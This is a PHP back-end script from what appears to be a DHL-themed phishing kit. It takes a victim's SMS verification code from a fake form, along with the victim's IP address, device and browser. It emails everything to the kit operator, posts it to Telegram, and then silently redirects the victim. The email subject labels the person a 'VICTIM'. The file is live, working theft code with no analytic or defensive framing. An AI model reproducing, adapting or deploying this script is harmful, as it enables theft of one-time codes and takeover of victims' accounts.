<?php
include("../../system/os.php");
include "../ur_email.php";
include("../../system/tlgrm.php");
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['jeansms2'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "+]###############[+] SMS CODE 2 [+]###############[+\n";
$message .= "# SMS CODE           : ".$_POST['jeansms2']."\n";
$message .= "# IP INFO            : $ip\n";
$message .= "# TIME/DATE          : $date\n";
$message .= "# DEVICE             : $user_os\n";
$message .= "# BROWSER            : $user_browser\n";
$message .= "+]###############[+] J E A N [+]###############[+\n";
$send = "$jean_email";
$subject = "📦 SMS CODE 2 VICTIM FROM = $ip";
$headers = "From: J E A N <dhl@jean8.vip>";
mail($send,$subject,$message,$headers);
telegram($message);
echo "<meta http-equiv='refresh' content='0; url=../../redirect.php'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; ../../redirect.php' />";
}

?>